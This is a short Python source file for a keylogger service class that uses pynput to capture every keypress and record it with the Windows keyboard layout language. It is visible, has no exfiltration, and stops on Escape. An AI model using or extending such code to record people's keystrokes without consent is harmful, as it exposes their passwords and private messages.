import ctypes
from pynput import keyboard
from IKeyLogger import IKeyLogger


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.running = False
        self.listener = None
        self.list_data = []

    @staticmethod
    def get_keyboard_language():
        try:
            user32 = ctypes.WinDLL("user32", use_last_error=True)
            hkl = user32.GetKeyboardLayout(0)
            lang_id = hkl & 0xFFFF
            return lang_id
        except Exception as e:
            print(f"error getting keyboard language : {e}")
            return None

    def on_press(self, key):
        try:
            key_str = key.char if hasattr(key, 'char') else str(key)
            if key == keyboard.Key.esc:
                print("stop keylogger...")
                self.stop_logging()
                return

            lang = self.get_keyboard_language()
            print(f"pressed  ")
            self.list_data.append((key_str, lang))
        except Exception as e:
            print(f"error : {e}")

    def start_logging(self):
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        self.running = False
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self):
        return self.list_data

    def clear_data(self):
        self.list_data = []
